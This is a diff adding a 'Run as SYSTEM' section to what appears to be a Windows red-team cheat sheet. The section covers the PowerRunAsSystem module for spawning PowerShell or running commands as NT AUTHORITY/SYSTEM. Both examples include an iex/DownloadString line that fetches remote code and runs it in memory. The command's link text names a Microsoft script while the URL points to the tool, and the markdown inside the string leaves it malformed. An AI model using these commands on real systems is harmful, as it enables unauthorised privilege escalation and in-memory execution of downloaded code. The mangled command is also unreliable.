@@ -213,3 +213,19 @@ function IsAdmin {
 ```powershell
 Get-ADPrincipalKerberosTokenGroup <username>
 ```
+
+# Run as SYSTEM
+## [PowerRunAsSystem](https://github.com/DarkCoderSc/PowerRunAsSystem)
+
+### Create a new PowerShell instance running under the context of ```NT AUTHORITY/SYSTEM```
+```powershell
+# iex(New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1](https://raw.githubusercontent.com/DarkCoderSc/PowerRunAsSystem/main/PowerRunAsSystem/PowerRunAsSystem.psm1)')
+Invoke-InteractiveSystemPowerShell
+```
+
+### Run a command under the context of ```NT AUTHORITY/SYSTEM```
+```powershell
+# iex(New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1](https://raw.githubusercontent.com/DarkCoderSc/PowerRunAsSystem/main/PowerRunAsSystem/PowerRunAsSystem.psm1)')
+Invoke-SystemCommand -Execute "powershell.exe" -Argument "whoami \| Out-File C:\result.txt"
+```
+
